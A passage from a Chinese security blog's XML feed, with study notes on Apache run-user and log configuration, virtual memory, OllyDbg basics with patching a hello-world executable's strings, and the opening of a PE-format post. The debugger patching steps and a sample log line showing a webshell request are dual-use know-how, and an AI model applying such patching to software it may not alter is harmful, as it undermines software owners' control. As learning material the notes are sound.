start</span><br></pre></td></tr></table></figure><p>第一行是Apache的主进程，是以root运行的。因为Apache的Web开放的端口是80或者443，小于1024的端口需要有root权限，因此主进程必须是root.从第二行开始为Apache的子进程。用户为www-data，是Ubuntu中运行服务的默认用户，权限较低。</p><p>如果用户为www-data用户的话，此时就算黑客拿到一个webshell，权限也是比较低的。</p><p>3）配置权限</p><p>如果管理配置不当（默认安装为www-data），这里是高权限用户的话，需要更改为低权限用户。</p><p>配置文件路径为：/var/apache2/envvars文件中16、17行进行配置：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.</span></span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_USER=www-data</span><br><span class="line"><span class="attribute">export</span> APACHE_RUN_GROUP=www-data</span><br></pre></td></tr></table></figure><h2 id="0x05-Apache日志文件格式"><a href="#0x05-Apache日志文件格式" class="headerlink" title="0x05 Apache日志文件格式"></a>0x05 Apache日志文件格式</h2><p>Apache会生成两个主要的日志文件，一个是Web访问日志<code>access.log</code>，一个是记录服务器运行时出错的日志<code>error.log</code>。</p><p>1）配置文件<code>/etc/apache2/apache2.conf</code>或者<code>/etc/httpd/conf/httpd.conf</code>中定义了日志格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">212</span> LogFormat <span class="string">"%v:%p %h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> vhost_combined</span><br><span class="line"><span class="attribute">213</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O \"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""</span> combined</span><br><span class="line"><span class="attribute">214</span> LogFormat <span class="string">"%h %l %u %t \"%r\" %&gt;s %O"</span> common</span><br><span class="line"><span class="attribute">215</span> LogFormat <span class="string">"%&#123;Referer&#125;i -&gt; %U"</span> referer</span><br><span class="line"><span class="attribute">216</span> LogFormat <span class="string">"%&#123;User-agent&#125;i"</span> agent</span><br><span class="line"><span class="attribute">217</span></span><br><span class="line"><span class="attribute">218</span></span><br><span class="line"><span class="attribute">219</span> CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log common</span><br><span class="line"></span><br><span class="line"><span class="attribute">212</span>行是虚拟主机的日志格式</span><br><span class="line"><span class="attribute">213</span>行是组合日志格式</span><br><span class="line"><span class="attribute">213</span>行是通用的日志格式</span><br><span class="line"><span class="attribute">219</span>行自定义设置日志使用那个格式的日志</span><br></pre></td></tr></table></figure><p>2） <code>/var/log/apache2/access.log</code>日志格式如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">111</span>.196.209.199 - -<span class="meta"> [05/Dec/2017:22:40:02 +0800] "GET /zk/shell.php HTTP/1.1" 304 164 "http://114.115.214.203/zk/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">远端主机：111.196.209.199</span></span><br><span class="line"><span class="meta">远端登录名：-</span></span><br><span class="line"><span class="meta">远程用户名：-</span></span><br><span class="line"><span class="meta">访问时间：[05/Dec/2017:22:40:02 +0800]</span></span><br><span class="line"><span class="attribute">HTTP</span>请求：GET /zk/shell.php HTTP/1.1</span><br><span class="line"><span class="attribute">HTTP</span>状态码：304</span><br><span class="line">发送的字节数：164</span><br><span class="line"><span class="attribute">Referer</span>：http://114.115.214.203/zk/</span><br><span class="line"><span class="attribute">User</span>-Agent：<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"</span></span><br></pre></td></tr></table></figure><p>3） <code>/var/log/apache2/error.log</code>日志格式如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Tue Dec 05 22:39:10.798632 2017</span>] [core:notice] [pid <span class="number">2970</span>] AH00094: Command line: <span class="string">'/usr/sbin/apache2'</span></span><br><span class="line">[<span class="meta">日期和时间</span>]   [错误等级]   错误消息</span><br></pre></td></tr></table></figure><p>4）日志备份</p><p>在服务器受到入侵之后，我们可以观察访问日志来溯源。当然如果access.log文件被删除清空之后就会变的非常麻烦，因此很多大型企业都设置的日志服务器同步日志文件到其它服务器，这样黑客想要彻底清除痕迹还需要搞定日志服务器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache安全配置&quot;&gt;&lt;a href=&quot;#Apache安全配置&quot; class=&quot;headerlink&quot; title=&quot;Apache安全配置&quot;&gt;&lt;/a&gt;Apache安全配置&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://www.jianshu.com/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>物理内存和虚拟内存的联系与区别</title>
    <link href="http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/"/>
    <id>http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</id>
    <published>2020-02-13T03:31:44.000Z</published>
    <updated>2020-02-21T08:02:19.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="虚拟内存与物理内存的联系与区别"><a href="#虚拟内存与物理内存的联系与区别" class="headerlink" title="虚拟内存与物理内存的联系与区别"></a>虚拟内存与物理内存的联系与区别</h1><p>重要的概念，需要弄清楚。</p><h2 id="物理内存与虚拟内存"><a href="#物理内存与虚拟内存" class="headerlink" title="物理内存与虚拟内存"></a>物理内存与虚拟内存</h2><p>操作系统有虚拟内存与物理内存的概念。</p><p>在很久以前，还没有虚拟内存概念的时候，程序寻址用的都是物理地址。程序能寻址的范围是有限的，这取决于CPU的地址线条数。比如在<strong>32位平台下，寻址的范围是2^32也就是4G</strong>。并且这是固定的，如果没有虚拟内存，且每次开启一个进程都给4G的物理内存，就可能会出现很多问题：</p><ul><li>因为我的物理内存时有限的，当有多个进程要执行的时候，都要给4G内存，很显然你内存小一点，这很快就分配完了，于是没有得到分配资源的进程就只能等待。当一个进程执行完了以后，再将等待的进程装入内存。这种频繁的装入内存的操作是很没效率的</li><li>由于指令都是直接访问物理内存的，那么我这个进程就可以修改其他进程的数据，甚至会修改内核地址空间的数据，这是我们不想看到的</li><li>因为内存时随机分配的，所以程序运行的地址也是不正确的。</li></ul><p>针对上面会出现的各种问题，虚拟内存就出来了。</p><p>在之前一篇文章中进程分配资源介绍过一个进程运行时都会得到4G的虚拟内存。这个虚拟内存你可以认为，每个进程都<strong>认为</strong>自己拥有4G的空间，这只是每个进程认为的，但是实际上，在虚拟内存对应的物理内存上，可能只对应的<strong>一点点</strong>的物理内存，实际用了多少内存，就会对应多少物理内存。</p><p>进程得到的这4G虚拟内存是一个连续的地址空间（这也只是进程认为），而实际上，它通常是被分隔成多个物理内存碎片，还有一部分存储在外部磁盘存储器上，在需要时进行<strong>数据交换</strong>。</p><p>进程开始要访问一个地址，它可能会经历下面的过程</p><ol><li>每次我要访问地址空间上的某一个地址，都需要把地址翻译为实际物理内存地址</li><li>所有进程共享这整一块物理内存，每个进程只把自己目前需要的虚拟地址空间映射到物理内存上</li><li>进程需要知道哪些地址空间上的数据在物理内存上，哪些不在（可能这部分存储在磁盘上），还有在物理内存上的哪里，这就需要通过页表来记录</li><li>页表的每一个表项分两部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页的地址（如果在的话）</li><li>当进程访问某个虚拟地址的时候，就会先去看页表，如果发现对应的数据不在物理内存上，就会发生缺页异常<br>缺页异常的处理过程，操作系统立即阻塞该进程，并将硬盘里对应的页换入内存，然后使该进程就绪，如果内存已经满了，没有空地方了，那就找一个页覆盖，至于具体覆盖的哪个页，就需要看操作系统的页面置换算法是怎么设计的了。</li></ol><p><strong>关于虚拟内存与物理内存的联系如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.png" alt></p><p><strong>页表的工作原理如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/%E7%BD%AE%E6%8D%A2%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B.png" alt></p><ol><li>我们的cpu想访问虚拟地址所在的虚拟页(VP3)，根据<strong>页表</strong>，找出页表中第三条的值.判断有效位。 如果有效位为1，DRMA缓存命中，根据物理页号，找到物理页当中的内容，返回。</li><li>若有效位为0，参数缺页异常，调用内核缺页异常处理程序。内核通过页面置换算法选择一个页面作为被覆盖的页面，将该页的内容刷新到磁盘空间当中。然后把VP3映射的磁盘文件缓存到该物理页上面。然后页表中第三条，有效位变成1，第二部分存储上了可以对应物理内存页的地址的内容。</li><li>缺页异常处理完毕后，返回中断前的指令，重新执行，此时缓存命中，执行1。</li><li>将找到的内容映射到告诉缓存当中，CPU从告诉缓存中获取该值，结束。</li></ol><h2 id="再来总结一下虚拟内存是怎么工作的"><a href="#再来总结一下虚拟内存是怎么工作的" class="headerlink" title="再来总结一下虚拟内存是怎么工作的"></a>再来总结一下虚拟内存是怎么工作的</h2><p>当每个进程创建的时候，内核会为进程分配4G的虚拟内存，当进程还没有开始运行时，这只是一个<strong>内存布局</strong>。实际上并不立即就把虚拟内存对应位置的程序数据和代码（比如.text .data段）拷贝到物理内存中，只是建立好虚拟内存和磁盘文件之间的<strong>映射</strong>就好（叫做存储器映射）。这个时候数据和代码<strong>还是在磁盘上</strong>的。当运行到对应的程序时，进程去寻找页表，发现页表中地址没有存放在物理内存上，而是在磁盘上，于是发生<strong>缺页异常</strong>，于是将磁盘上的数据拷贝到物理内存中。</p><p>另外在进程运行过程中，要通过malloc来动态分配内存时，也只是分配了虚拟内存，即为这块虚拟内存对应的页表项做相应设置，当进程真正访问到此数据时，才引发缺页异常。</p><p>可以认为虚拟空间都被映射到了磁盘空间中（事实上也是按需要映射到磁盘空间上，通过mmap，mmap是用来建立虚拟空间和磁盘空间的映射关系的）</p><h2 id="利用虚拟内存机制的优点"><a href="#利用虚拟内存机制的优点" class="headerlink" title="利用虚拟内存机制的优点"></a>利用虚拟内存机制的优点</h2><ul><li>既然每个进程的内存空间都是一致而且固定的（<strong>32位平台下都是4G</strong>），所以链接器在链接可执行文件时，可以设定内存地址，而不用去管这些数据最终实际内存地址，这交给内核来完成映射关系</li><li>当不同的进程使用同一段代码时，比如库文件的代码，在物理内存中可以只存储一份这样的代码，不同进程只要将自己的虚拟内存映射过去就好了，这样可以节省物理内存</li><li>在程序需要分配连续空间的时候，只需要在虚拟内存分配连续空间，而不需要物理内存时连续的，实际上，往往物理内存都是断断续续的内存碎片。这样就可以有效地利用我们的物理内存</li></ul><h2 id="不同系统的虚拟空间"><a href="#不同系统的虚拟空间" class="headerlink" title="不同系统的虚拟空间"></a>不同系统的虚拟空间</h2><h3 id="windows-32下的虚拟地址空间"><a href="#windows-32下的虚拟地址空间" class="headerlink" title="windows 32下的虚拟地址空间"></a>windows 32下的虚拟地址空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/win32%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt></p><p>在 Windows 系统下，虚拟地址空间被分成了 4 部分： <strong>NULL 指针区、用户区、 64KB 禁入区、内核区</strong>。</p><ul><li><strong>用户区</strong>每个进程私有使用的，大约 2GB 左右 ( 最大可以调整到 3GB，3GB模式) ，称为用户地址空间。用户区存放的是<strong>程序代码和数据, 堆, 共享库, 栈</strong>。</li><li><strong>内核区</strong>是所有进程共享的，为 2GB ，称为系统地址空间。内核区保存的是系统线程调度、内存管理、设备驱动等数据，这部分数据供所有的进程共享以及操作系统的使用——程序在运行的时候处于操作系统的监管下，监管进程的虚拟空间，当进程进行非法访问时强制结束程序。（2GB的内核区是所有的进程都是同一个2GB吗）</li><li>上述的2GB+2GB称为2GB模式，是在默认的windows配置下。可以修改windows配置，可以设置3GB用户地址空间+1GB的系统地址空间，称为3GB模式。</li></ul><h3 id="Linux下的4GB虚拟内存空间"><a href="#Linux下的4GB虚拟内存空间" class="headerlink" title="Linux下的4GB虚拟内存空间"></a>Linux下的4GB虚拟内存空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/D:%5Cgitblog%5Csec%5Csource_posts%5C%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB%5Clinux%E5%86%85%E5%AD%98.png" alt></p><blockquote><p>上图由上往下是高地址到低地址；下图由上往下是低地址到高地址；</p></blockquote><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png" alt></p><p>每个段的存放内容如下：</p><ul><li><p><strong>.reserve(预留)段</strong><br>一共占用128M，属于预留空间，进程是禁止访问的</p></li><li><p><strong>.text(代码段)</strong><br>可执行文件加载到内存中的只有数据和指令之分，而指令被存放在.text段中，一般是共享的，编译时确定,只读，不允许修改</p></li><li><p><strong>.data</strong><br>存放在编译阶段(而非运行时)就能确定的数据,可读可写。也就是通常所说的静态存储区,赋了初值的全局变量和赋初值的静态变量存放在这个区域,常量也存放在这个区域</p></li><li><p><strong>.bss段</strong><br>通常用来存放程序中未初始化以及初始化为0的全局/静态变量的一块内存区域，在程序载入时由内核清0</p></li><li><p><strong>.heap(堆)</strong><br>用于存放进程运行时动态分配的内存，可动态扩张或缩减，这块内存由程序员自己管理，通过malloc/new可以申请内存，free/delete用来释放内存，heap的地址从低向高扩展，是不连续的空间</p></li><li><p><strong>.stack(栈)</strong><br>记录函数调用过程相关的维护性信息，栈的地址从高地址向低地址扩展，是连续的内存区域</p></li><li><p><strong>共享库(libc.so)</strong></p></li></ul><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>转载自 ： <a href="https://blog.csdn.net/wyq_5/article/details/77481136" target="_blank" rel="noopener">https://blog.csdn.net/wyq_5/article/details/77481136</a> </p><p>转载自 ： <a href="https://blog.csdn.net/lvyibin890/article/details/82217193" target="_blank" rel="noopener">https://blog.csdn.net/lvyibin890/article/details/82217193</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;a href=&quot;#虚拟内存与物理内存的联系与区别&quot; class=&quot;headerlink&quot; title=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;/a&gt;虚拟内存与物理内存的联系与区别&lt;/h1&gt;&lt;p&gt;重要的概念，需要弄清楚。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>OD操作和RE基本思路</title>
    <link href="http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-11T07:58:51.000Z</published>
    <updated>2020-02-11T09:02:00.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD基本操作和RE基本思想"><a href="#OD基本操作和RE基本思想" class="headerlink" title="OD基本操作和RE基本思想"></a>OD基本操作和RE基本思想</h1><p>这篇写一些比较简单的知识，主要用来记录od的一些操作和介绍一些RE基本的操作和思想</p><h2 id="OD操作"><a href="#OD操作" class="headerlink" title="OD操作"></a>OD操作</h2><ul><li><p>F2 ：下断点</p></li><li><p>F4 :  执行到光标所在的位置</p></li><li><p>F9 ：debug程序</p></li><li><p>F7 :   单步步进（step into）</p></li><li><p>F8 :   单步步过（step over）</p></li></ul><ul><li><p>ctrl + F9 ：一直在函数代码内部运行，直到遇到RETN</p></li><li><p>ctrl + F2 ：重新开始调试</p></li><li><p>ctrl + G : 移动到指定位置</p></li><li><p>ctrl + E ：编辑数据</p></li></ul><ul><li><p>； ： 用来添加注释（得把输入法改为英文才可以用）</p></li><li><p>： ： 用来添加标签（得把输入法改为英文才可以用）</p></li><li><p>space ：修改汇编代码</p></li><li><p>enter ：若光标处有call/jmp等指令，则跟踪并显示相关地址</p></li></ul><h2 id="快速回到“据点”方法"><a href="#快速回到“据点”方法" class="headerlink" title="快速回到“据点”方法"></a>快速回到“据点”方法</h2><ul><li>ctrl + G 输入据点地址，直接回到据点的位置</li><li>在每个据点 F2 设置断点</li><li>在每个据点处 ：添加注释</li><li>在每个据点处 ；添加标签</li></ul><h2 id="EP概念"><a href="#EP概念" class="headerlink" title="EP概念"></a>EP概念</h2><p>EP是<strong>windows可执行文件的代码入口点</strong>。</p><p>是执行应用程序时最先执行的代码的起始位置，依赖于CPU。</p><blockquote><p>重点：EP并不是main函数入口。调试代码时，出现在EP位置的是开发工具（Visual C++等）生成的启动函数。</p></blockquote><h2 id="快速找到指定代码的四种方法"><a href="#快速找到指定代码的四种方法" class="headerlink" title="快速找到指定代码的四种方法"></a>快速找到指定代码的四种方法</h2><p>如何快速找到需要的代码（如main入口等），有下面四种方法。下面的例子假设都是为了找到程序中的 main 函数。而 main 的内容是调用了系统的 MessageBoxW() API 然后弹出 helloworld： </p><h3 id="1、代码执行法"><a href="#1、代码执行法" class="headerlink" title="1、代码执行法"></a>1、代码执行法</h3><p><strong>不断按 F8（不跟踪进函数内部）执行程序</strong>。</p><p>当函数执行到某一时刻程序弹出了窗口显示hello world，就可以判断该函数就是所找的 main 函数。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B3%95.png" alt></p><h3 id="2、字符串检索法"><a href="#2、字符串检索法" class="headerlink" title="2、字符串检索法"></a>2、字符串检索法</h3><p><strong>右键 -&gt; Search for -&gt; All referenced text strings</strong>，这样就能看到程序代码引用的字符串并整理到列表中。</p><p>那么我们就可以检索 hello world 然后定位到 main 函数的位置。</p><blockquote><p>吾爱破解版的可以使用 <strong>右键 -&gt; 中文搜索引擎 -&gt; 智能搜索</strong>  实现检索字符串。如果使用上面的选项是无法得到预期结果的。</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%99%BA%E8%83%BD%E6%90%9C%E7%B4%A2.png" alt></p><h3 id="3、API检索法-1"><a href="#3、API检索法-1" class="headerlink" title="3、API检索法-1"></a>3、API检索法-1</h3><p><strong>右键 -&gt; Search for -&gt; All intermodular calls</strong>，这样就能看到程序代码运行时调用的 API 函数列表。</p><p>那么我们知道 main 函数调用了一个窗口显示hello world，我们就能对应找到窗口调用API MessageBoxW，然后定位到 main 。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-1.png" alt></p><h3 id="4、API检索法-2"><a href="#4、API检索法-2" class="headerlink" title="4、API检索法-2"></a>4、API检索法-2</h3><p><strong>右键 -&gt; Search for -&gt; Name in all calls</strong>。od不能给所有可执行文件都列出API函数列表(压缩或者保护器等)，使用这个命令可以列出被加载的DLL文件提供的所有API。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-2.png" alt></p><h2 id="打补丁修改字符串"><a href="#打补丁修改字符串" class="headerlink" title="打补丁修改字符串"></a>打补丁修改字符串</h2><h3 id="1、直接修改字符串缓冲区"><a href="#1、直接修改字符串缓冲区" class="headerlink" title="1、直接修改字符串缓冲区"></a>1、直接修改字符串缓冲区</h3><p>由od我们能看出 hello world 字符串的内存位置 0x4092A0</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%8D%E7%BD%AE.png" alt></p><p>直接到dump窗口中 ctrl + G 定位到字符串，选中修改的字符串段并用 <strong>ctrl + E</strong> 打开编辑</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E7%BC%96%E8%BE%91.png" alt></p><p>将字符串 world 修改为 shabi 并保存 </p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9.png" alt></p><p>再次F9运行可以看到结果已经改变了</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%94%B9%E5%8F%98.png" alt></p><h3 id="2、在其他区域生成新字符串并传递给消息函数"><a href="#2、在其他区域生成新字符串并传递给消息函数" class="headerlink" title="2、在其他区域生成新字符串并传递给消息函数"></a>2、在其他区域生成新字符串并传递给消息函数</h3><p>通过od我们能看到 main 函数中，0x401007地址的地方有一条 push 004092A0 的命令，它是将 4092A0 地址的 hello world 字符串以参数传递给 MessageBoxW函数。所以我们可以<strong>修改字符串地址</strong>指向我们新建的位置。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98.png" alt></p><p>这里在dump窗口中找到 409F50的位置，选中需要的位置并加入字符串</p><blockquote><p>值得注意的是 unicode 字符在内存中保存每个字符后面都得加上 0x00 ；</p><p>并且 unicode 字符串结尾需要 NULL 即需要两个 0x00；</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%88%90%E5%8A%9F.png" alt></p><p>可见参数被我们修改为指向新建立的那一段内存中的字符串，函数成功执行为显示其他的内容。</p><h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p>选中修改内容 -&gt; 右键 -&gt; Copy to executable file -&gt; 在弹出的窗口中右键 -&gt; Save file -&gt; 保存为exe文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一篇知识简单的介绍了od的一些操作，并介绍了定位关键函数和修改字符串参数的一些具体操作，打好基础。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;a href=&quot;#OD基本操作和RE基本思想&quot; class=&quot;headerlink&quot; title=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;/a&gt;OD基本操作和RE基本思想&lt;/h1&gt;&lt;p&gt;这篇写一些比较简单的知识，主要用来记录od的一些操作
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PE文件</title>
    <link href="http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/"/>
    <id>http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/</id>
    <published>2020-02-09T06:34:22.000Z</published>
    <updated>2020-02-16T09:20:12.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h1><p>继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。</p><blockquote><p>实例都是十六进制表示，就不标注0x或者h了</p></blockquote><h2 id="PE概念"><a href="#PE概念" class="headerlink" title="PE概念"></a>PE概念</h2><p>PE是windows平台下可执行文件的格式</p><p>32位的可执行文件称为<strong>PE文件或者PE32</strong></p><p>64位的可执行文件称为<strong>PE+或者PE32+</strong></p><h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>不同PE文件的主拓展名</p><ul><li>可执行系列 ：EXE 、SCR</li><li>库系列的 ：DLL、OCX、CPL、DRV</li><li>驱动程序系列 ：SYS、VXD</li><li>对象文件系列 ：OBJ</li></ul><h2 id="PE文件基本结构"><a href="#PE文件基本结构" class="headerlink" title="PE文件基本结构"></a>PE文件基本结构</h2><ul><li>PE头：DOS头到节区头的部分</li><li>PE体：PE头下的节区合称PE体</li><li>文件的内容一般可以分为<strong>代码 .text 、数据 .data 、资源 .rsrc节</strong>分别保存</li><li>各节区头定义了各节区在文件或者内存中的大小、位置、属性等</li></ul><p>notepad加载到内存中：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><h2 id="VA-amp-RVA-amp-ImageBase"><a href="#VA-amp-RVA-amp-ImageBase" class="headerlink" title="VA &amp; RVA &amp; ImageBase"></a>VA &amp; RVA &amp; ImageBase</h2><p>概念：</p><ul><li><strong>VA：进程虚拟内存的绝对地址</strong></li><li><strong>RVA：相对虚拟地址</strong></li><li><strong>ImageBase：RVA = VA - ImageBase</strong></li></ul><p>位置的不同表述：</p><ul><li>文件：使用偏移表示位置</li><li>内存：使用VA表示位置</li></ul><blockquote><p>32位windows中，每个进程分配有4GB的虚拟内存，因此进程中VA的范围是 00000000~FFFFFFFF</p></blockquote><h2 id="PE头结构"><a href="#PE头结构" class="headerlink" title="PE头结构"></a>PE头结构</h2><p><strong>PE头=DOS头+DOS存根+NT头（文件头+可选头）+节区头</strong></p><hr><h3 id="1-DOS头（IMAGE-DOS-HEADER）"><a href="#1-DOS头（IMAGE-DOS-HEADER）" class="headerlink" title="1. DOS头（IMAGE_DOS_HEADER）"></a>1. DOS头（IMAGE_DOS_HEADER）</h3><p>DOS头即是在PE头的最前面添加一个 IMAGE_DOS_HEADER 结构体，用来拓展已有的DOS EXE头。结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/dos%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中最重要的两个成员变量：</p><ul><li><strong>e_magic : DOS签名</strong>。</li><li><strong>e_lfanew ：指示NT头的偏移（即指向真正的PE头）</strong>。</li></ul><p>notepad++的DOS头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84DOS%E5%A4%B4.png" alt></p><ul><li>开头WORD型的4D5A，即是e_magic，代表签名MZ；</li><li>末尾LONG型的00000110，即是e_lfanew，指向NT头；（Intel的小端序标识）</li></ul><hr><h3 id="2-DOS存根"><a href="#2-DOS存根" class="headerlink" title="2. DOS存根"></a>2. 